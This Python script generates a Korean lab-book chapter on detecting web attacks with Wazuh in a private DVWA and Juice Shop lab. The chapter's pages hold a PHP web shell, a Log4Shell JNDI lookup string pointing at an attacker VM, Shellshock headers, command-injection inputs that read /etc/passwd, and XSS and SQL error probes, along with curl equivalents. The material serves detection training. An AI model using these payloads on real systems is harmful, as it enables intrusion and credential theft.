"""7장 공격 입력과 데이터 생성 절차. 기존 슬라이드 결과와 신규 예상 결과를 구분한다."""
from write_chapter01 import p,h,tab,code

def add_labs(pages):
 commands=[];inputs=[]
 def page(title,*b):return {'title':title,'kind':'body','blocks':list(b)}
 def c(text,why,result,where='kt66-web 컨테이너 안'):
  b={'type':'command','id':'','text':text,'why':why,'result':result,'where':where};return b
 def bi(name,text):inputs.append({'file':name+'.txt','text':text});return code(text)
 def after(title,*new):
  i=next(i for i,v in enumerate(pages) if v['title']==title);pages[i+1:i+1]=new
 after('7.1  기록을 읽는 순서',
 page('7.1  공격 실습 준비',
  p('자신의 kt66에서 요청을 보내 로그를 만든다. Windows 브라우저로 웹 요청을 보내고 Wazuh를 조회한다. 파일 생성은 kt66 VM 터미널, 선택 curl 명령은 공격자 VM에서 실행한다.'),
  p('① 5장의 hosts 등록과 DVWA 초기 준비를 마친다. 본문의 kt66.lab은 자신의 LAB_DOMAIN, 192.168.0.189는 자신의 kt66 웹 진입 IP로 바꾼다.'),
  p('② DVWA에 로그인한다. 데모 계정은 admin / password이다. DVWA Security의 현재 값을 메모한 뒤 Low → Submit을 선택한다.'),
  p('③ 별도 탭에서 Wazuh Discover를 연다. web 에이전트가 연결돼 있고 /var/log/apache2/dvwa_access.log와 juice_access.log를 수집하는지 4장의 절차로 확인한다. FIM 사례는 /var/www 감시가 필요하다.'),
  p('④ 공격 전 시각을 적고 요청을 보낸다. Network의 응답과 같은 기간의 Wazuh 기록을 대조한다. 데이터가 없으면 원본 로그 → 에이전트 → 인덱스·기간 순서로 확인한다.'),
  p('이 장의 결과 화면은 슬라이드의 기존 기록이다. 아래 절차로 새로 만든 기록은 자신의 실습 시각으로 찾는다. 새 절차의 실행 결과를 검증한 화면으로 해석하지 않는다.'),
  tab(['작업','완료 기준'],[['파일 생성','FIM에서 실습 파일의 경로를 확인.'],['웹 요청','URL·출발지·응답을 접속 로그와 Wazuh에서 연결.'],['종료','실습 파일 삭제, User-Agent와 DVWA 단계 복구.']],[30,97])))
 after('7.2  웹셸 · 파일과 요청을 연결한다',
 page('7.2  웹 폴더와 파일 확인',
  p('먼저 웹 폴더에 파일을 만들어 FIM 기록을 생성한다. 슬라이드도 서버에서 파일을 직접 만든 사례이다. 웹 업로드 기능을 통과한 시험과 구분한다.'),
  c('docker exec -it kt66-web /bin/bash','docker exec는 실행 중인 컨테이너에서 프로그램을 시작한다. -i는 입력 유지, -t는 터미널 할당, /bin/bash는 대화형 셸이다.','이후 파일 명령은 kt66-web 안에서 실행한다.','kt66 VM · 호스트 터미널'),
  c('ls -ld /var/www/html/uploads','ls는 파일 정보를 표시한다. -l은 상세 정보, -d는 디렉터리 자체의 정보를 표시한다.','폴더가 있는지 확인한다. 없을 때만 다음 명령으로 만든다.'),
  c('mkdir -p /var/www/html/uploads','mkdir는 디렉터리를 만든다. -p는 필요한 상위 경로도 만들고 기존 폴더는 유지한다.','ls -ld /var/www/html/uploads로 생성 결과를 확인한다.'),
  c('ls -l /var/www/html/uploads/book07-shell.php','쓸 파일의 존재 여부를 먼저 확인한다. book07-shell.php는 이 실습의 새 파일명이다.','No such file or directory일 때 진행한다. 이미 있으면 내용을 확인하고 다른 실습 파일명을 정한다.')),
 page('7.2  웹셸 파일 작성',
  c('vim /var/www/html/uploads/book07-shell.php','Vim은 kt66-web에 설치된 텍스트 편집기이다. i를 눌러 입력 모드로 바꾸고 다음 코드를 입력한다. Esc → :wq → Enter로 저장하고 닫는다.','PHP 코드를 파일로 저장한다. :wq에서 w는 저장, q는 종료이다. 저장하지 않고 취소하려면 Esc → :q! → Enter를 누른다.'),
  code("<?php\nif (isset($_GET['cmd'])) {\n    system($_GET['cmd']);\n}\n"),
  p('PHP는 서버에서 처리하는 스크립트 언어이다. $_GET은 URL 쿼리 값을 읽는다. isset은 cmd 값의 존재를 확인하고, system은 그 값을 운영체제 명령으로 실행한다. 중괄호 { }는 조건이 참일 때 수행할 부분이다.'),
  c('cat /var/www/html/uploads/book07-shell.php','cat은 파일 내용을 출력한다. 저장한 내용과 위 코드를 대조한다.','PHP 구문이 그대로 저장돼 있어야 한다. 달러 기호($)나 따옴표가 빠지지 않았는지 확인한다.'),
  c('exit','현재 컨테이너 셸을 닫는다.','kt66 호스트 터미널로 돌아간다.')),
 page('7.2  파일 요청과 FIM 조회',
  p('① Windows 브라우저에서 Ctrl+Shift+I → Network를 연다. 주소창에 다음 URL을 입력한다. id는 실행 계정과 그룹을 출력하는 명령이다.'),
  bi('B07-01-file','http://192.168.0.189/uploads/book07-shell.php?cmd=id'),
  p('② 요청의 Status Code와 Response를 읽는다. kt66-web에는 PHP 실행기가 없으며 슬라이드의 같은 종류 요청은 404였다. 이 구성에서 확인할 대상은 파일 생성 경보와 요청 기록이다.'),
  p('③ Discover에서 실습 기간을 지정한다. 7.2의 Q07-01로 파일 생성 기록을 찾고 syscheck.path가 이번 파일명인지 확인한다.'),
  code('agent.name: "web"\nAND data.url: *book07-shell.php*'),
  p('④ 접속 기록은 위 식으로 별도 검색한다. AND는 두 조건을 모두 만족시킨다. 별표(*)는 앞뒤의 다른 문자를 허용한다. 파일 경로·요청 URL·시각을 조사 양식에 적는다.'),
  p('파일 경보가 없으면 /var/www 감시 설정과 web 연결 상태부터 확인한다. PHP가 실행되는 별도 웹앱에서 실습할 때는 해당 컨테이너의 파일 감시도 필요하다.')))
 after('7.3  Log4Shell · 요청과 외부 조회',
 page('7.3  브라우저에서 조회 문자열 전송',
  p('로그에 JNDI 형태의 입력을 남긴다. 외부 LDAP 서버를 실행하는 단계는 포함하지 않는다. 192.168.0.202는 자신의 공격자 VM 주소로 바꾼다.'),
  p('① DVWA 탭의 개발자 도구에서 ⋮ → More tools → Network conditions를 연다. User agent의 Use browser default를 해제하고 Custom 입력란에 다음 값을 넣는다.'),
  bi('B07-02-jndi-agent','${jndi:ldap://192.168.0.202:1389/a}'),
  p('② 개발자 도구를 열어 둔 채 주소창에 다음 URL을 입력한다. ${…}는 Log4j의 조회 표현식 형태이다. LDAP 주소의 구성은 다음 결과 해석 페이지에서 읽는다.'),
  bi('B07-03-jndi-url','http://dvwa.kt66.lab/?q=%24%7Bjndi%3Aldap%3A%2F%2F192.168.0.202%3A1389%2Fa%7D'),
  p('③ Network에서 요청을 선택한다. Headers의 User-Agent·Request URL·Status Code를 기록한다. Q07-02로 같은 시각의 jndi 문자열을 찾는다.'),
  p('④ Use browser default를 다시 켠다. 새 요청의 User-Agent가 원래 브라우저 값인지 확인한다. 요청이 403이어도 접속 로그에 입력 문자열이 기록됐는지 조사한다.')))
 after('7.4  Shellshock · 헤더와 Bash',
 page('7.4  브라우저에서 Shellshock 요청',
  p('① 7.3과 같은 Network conditions 화면에서 User-Agent를 다음 값으로 바꾼다. /bin/bash -c는 뒤의 문자열을 Bash 명령으로 해석하도록 지정한다. id는 계정·그룹 식별자를 출력한다.'),
  bi('B07-04-shellshock-agent','() { :; }; /bin/bash -c "id"'),
  p('② 다음 URL을 한 번 요청한다. Network에서 요청 경로·헤더·응답을 적는다.'),
  bi('B07-05-shellshock-url','http://juice.kt66.lab/cgi-bin/test.cgi'),
  p('③ Q07-03으로 같은 기간을 검색한다. 접속 로그에 함수 형태의 헤더가 있고 Shellshock 규칙이 적용됐는지 확인한다. 대상이 CGI·Bash를 실행하는지는 별도 판단한다.'),
  p('④ 같은 헤더로 DVWA의 /cgi-bin/status를 요청해 응답 차이를 비교할 수 있다. 슬라이드는 Juice 요청에 User-Agent, DVWA 요청에 Referer를 사용했다. Referer를 지정하는 curl 예제는 이 장 뒤에 둔다.'),
  p('⑤ User-Agent를 브라우저 기본값으로 복구한다. 결과가 없으면 헤더가 실제로 바뀌었는지 → 원본 access 로그 → 인덱스·기간 순서로 확인한다.')))
 after('7.5  OS 명령 삽입 · 입력과 셸',
 page('7.5  DVWA에서 명령 삽입 입력',
  p('① DVWA에 로그인하고 Low 단계인지 확인한다. 왼쪽 Command Injection을 누른다. 먼저 주소 입력란에 127.0.0.1을 넣고 Submit을 누른다. 127.0.0.1은 애플리케이션이 실행되는 시스템 자신을 가리킨다.'),
  p('② Network에서 POST 요청과 응답을 확인한다. 정상 입력에서 ping 출력이 보이는지 먼저 확인한 뒤 주소를 다음과 같이 바꾸고 Submit을 한 번 누른다.'),
  bi('B07-06-command-input','127.0.0.1; id'),
  p('세미콜론(;) 뒤의 id를 추가 실행하도록 시도한 입력이다. WAF가 앞에서 차단하면 애플리케이션까지 전달되지 않을 수 있다.'),
  p('③ 화면의 출력과 HTTP 상태를 적는다. UID·GID 출력이 보이면 실행 결과로 조사하고, 403이면 WAF 감사 기록을 대조한다. Q07-04로 경로를 찾고 POST 본문은 modsec_audit.log에서 확인한다.'),
  p('④ 슬라이드의 URL 기반 기록을 만들려면 다음 주소를 브라우저에서 한 번 요청한다. 이는 GET 입력 검사 사례이며 위의 POST 폼 제출과 다르다.'),
  bi('B07-07-command-url','http://dvwa.kt66.lab/vulnerabilities/exec/?ip=127.0.0.1%7Ccat%20/etc/passwd'),
  p('⑤ 두 요청의 메서드·응답·입력 위치를 비교한다. 실습 종료 시 DVWA Security를 시작 전 값으로 돌린다.')))
 after('7.6  HTTP 200 · 처리 결과 확인',
 page('7.6  200 응답의 공격 입력 만들기',
  p('① Windows 브라우저에서 다음 Juice Shop 주소를 한 번 연다. 이 URL에는 XSS 형태의 입력이 들어 있다. %3C와 %3E는 각각 <와 >이다.'),
  bi('B07-08-ok-url','http://juice.kt66.lab/?q=%3Cscript%3Ealert(1)%3C/script%3E'),
  p('② Network에서 문서 요청의 Status Code와 Response를 확인한다. 웹앱 화면이 열렸는지, 알림 창이 나타났는지 각각 적는다. 주소에 스크립트가 있다고 브라우저가 자동으로 실행하는 것은 아니다.'),
  p('③ Q07-05로 규칙 31106을 검색한다. 실제 상태가 200이고 의심 URL이 기록됐는지 확인한다. 403이면 해당 사이트의 WAF 정책과 감사 기록부터 확인한다.'),
  p('슬라이드의 Juice 사이트는 WAF 탐지 전용 모드였다. 자신의 설정이 차단 모드이면 결과가 달라진다. 200 경보를 만들기 위해 전체 WAF를 끄지 말고 설정 차이를 조사 기록에 적는다.'),
  p('④ URL과 HTTP 상태, 경보, 화면에서 실제로 일어난 일을 함께 기록한다. 이 요청으로 별도 서버 설정을 바꾸지는 않는다.')))
 after('7.7  서버 오류 · 한 건과 급증',
 page('7.7  오류 요청을 보내고 건수 비교',
  p('① 브라우저에서 다음 검색 API 주소를 연다. API는 프로그램이 데이터를 요청하는 인터페이스이며, 이 주소는 상품 검색 결과를 반환한다. q의 %27은 작은따옴표이다.'),
  bi('B07-09-error-url','http://juice.kt66.lab/rest/products/search?q=%27'),
  p('② Network에서 상태를 읽는다. 슬라이드에서는 같은 종류의 입력에 500이 반환됐다. 자신의 응답이 500일 때 오류 반복 관찰을 진행한다.'),
  p('③ Network의 Preserve log를 켠다. 같은 요청을 다시 불러오는 동작을 한 번씩 수행해 총 20건 이내로 요청한다. 각 요청의 상태와 시각을 확인하며 요청 수를 적는다.'),
  p('④ Q07-06으로 5xx 기록을 찾는다. 같은 출발지·경로가 짧은 구간에 모였는지 확인한다. Q07-07은 반복 오류 규칙을 별도로 확인하는 식이다.'),
  p('③의 요청 횟수, Network의 500 개수, Wazuh의 검색 건수는 따로 적는다. 응답이 바뀌거나 접속이 끊기면 요청을 멈추고 서버 상태·WAF·수집을 확인한다.'),
  p('⑤ 반복을 끝내고 조사 기간·검색 조건을 메모한다. 검색 건수와 전체 access 로그 수를 비교하는 방법은 다음 페이지에서 다룬다.')))
 # Append cleanup and optional equivalent curl methods before review section.
 idx=next(i for i,v in enumerate(pages) if v['title']=='7.8  사례별 조사 결론')
 pages[idx:idx]=[
 page('7.8  실습 파일 원상복구',
  p('kt66 호스트에서 web 컨테이너에 들어간다. 이번에 만든 파일만 확인하고 삭제한다. 생성 전부터 있던 uploads 폴더와 다른 파일은 유지한다.'),
  c('docker exec -it kt66-web /bin/bash','-it로 대화형 셸에 접속한다.','이후 삭제·확인은 kt66-web 안에서 한다.','kt66 VM · 호스트 터미널'),
  c('cat /var/www/html/uploads/book07-shell.php','삭제할 파일의 내용을 먼저 읽는다.','이번에 작성한 PHP 코드인지 확인한다.'),
  c('rm -i /var/www/html/uploads/book07-shell.php','rm은 파일을 삭제하고 -i는 삭제 전에 확인을 묻는다.','표시된 경로가 맞으면 y를 입력한다.'),
  c('ls -l /var/www/html/uploads/book07-shell.php','삭제 후 같은 파일을 조회한다.','No such file or directory이면 제거됐다.'),
  c('exit','컨테이너 셸을 닫는다.','호스트로 돌아간다.')),
 page('7.8  브라우저 상태 원상복구',
  p('① Network conditions에서 Use browser default를 켠다. 새 요청을 보내 Headers에 브라우저의 기본 User-Agent가 표시되는지 확인한다.'),
  p('② DVWA Security를 실습 전에 기록한 단계로 바꾸고 Submit을 누른다. 현재 단계 표시를 확인한 뒤 Logout을 누른다.'),
  p('③ Q07-01의 규칙 번호를 553으로 바꾸어 파일 삭제 경보도 확인한다. 생성·삭제 기록은 조사 자료로 남긴다.'),
  p('④ Discover에 추가한 필터와 검색식을 지우고 이전 인덱스·기간으로 돌아간다.'),
  tab(['문제','확인 순서'],[['공격 기록이 안 보임','Network의 실제 요청 → 원본 access 로그 → 에이전트 → 기간·인덱스.'],['FIM 경보가 없음','파일 존재 → web의 /var/www 감시 → web 연결 상태.'],['응답이 슬라이드와 다름','대상 도메인 → 로그인·Low → WAF 모드·규칙 → 앱 버전.']],[40,87])),
 page('7.9  다른 방법 · curl의 기본 구문',
  p('curl은 터미널에서 URL로 요청을 보내고 응답을 읽는 도구이다. 1.12에서 설치한 공격자 VM에서 사용한다. 브라우저 실습의 헤더를 명령으로 지정할 때 이용한다.'),
  c('curl --version','--version은 버전과 지원 기능을 표시한다. 기본 구문은 curl 옵션 URL이다.','버전이 나오면 다음 요청을 수행할 수 있다. 없으면 1.12의 도구 설치를 먼저 마친다.','공격자 VM · 터미널'),
  tab(['옵션·기호','뜻'],[['-i','응답 헤더와 본문을 함께 표시.'],['--max-time 15','전체 대기 시간을 15초로 제한.'],['-A 값','User-Agent 헤더 값 지정.'],['-H 이름:값','지정한 이름의 요청 헤더 추가.'],['작은따옴표(\')','공백·$·중괄호 등을 셸 해석 없이 전달.'],['줄 끝 역슬래시(\\)','다음 줄까지 한 명령으로 연결.']],[39,88]),
  p('curl은 브라우저 로그인 세션을 자동으로 공유하지 않는다. 다음 예제는 요청 문자열을 로그에 남기는 용도이며 응답은 인증·WAF 정책에 따라 달라진다.')),
 page('7.9  다른 방법 · JNDI 헤더',
  c("curl -i --max-time 15 \\\n  -A '${jndi:ldap://192.168.0.202:1389/a}' \\\n  'http://dvwa.kt66.lab/?book07=lookup'",'User-Agent에 JNDI 조회 형태의 문자열을 넣는다. q 대신 book07 표식을 URL에 붙여 요청을 구분한다. IP는 자신의 공격자 VM 주소를 쓴다.','상태·본문을 읽고 Q07-02에서 같은 요청을 찾는다. full_log에서 실제 헤더 값을 확인한다.','공격자 VM · 터미널'),
  p('작은따옴표를 빼면 셸이 달러 기호나 중괄호를 먼저 해석할 수 있다. 문자열을 그대로 HTTP 헤더로 전달해야 한다. 외부 LDAP 조회나 코드 실행 여부는 이 요청의 응답만으로 판정하지 않는다.')),
 page('7.9  다른 방법 · Shellshock 헤더',
  c("curl -i --max-time 15 \\\n  -A '() { :; }; /bin/bash -c \"id\"' \\\n  http://juice.kt66.lab/cgi-bin/test.cgi",'-A로 User-Agent 값을 지정한다. 큰따옴표는 바깥 작은따옴표 안에 있으므로 헤더에 포함된 문자로 전달된다.','HTTP 상태와 Q07-03의 경보를 대조한다. 명령 실행은 응답 본문·서버 기록으로 별도 확인한다.','공격자 VM · 터미널'),
  c("curl -i --max-time 15 \\\n  -H 'Referer: () { :; }; id' \\\n  http://dvwa.kt66.lab/cgi-bin/status",'-H는 Referer 헤더를 추가한다. 콜론 뒤는 헤더 값이다. 이번에는 함수 구문 뒤에 id를 붙인다.','User-Agent 대신 Referer에 남은 구문과 응답을 원문에서 확인한다.','공격자 VM · 터미널'))]
 for pg in pages:
  if pg['title'] in ['7.8  사례별 조사 결론','7.8  검색 결과가 다를 때','7.8  확인 문제 해설']:pg['title']=pg['title'].replace('7.8','7.10',1)
 # Renumber commands in reading order and export additional browser/query inputs.
 for pg in pages:
  for b in pg['blocks']:
   if b['type']=='command':b['id']=f'C07-{len(commands)+1:02d}';commands.append(b)
 inputs.append({'file':'Q07-file-request.txt','text':'agent.name: "web"\nAND data.url: *book07-shell.php*'})
 return commands,inputs
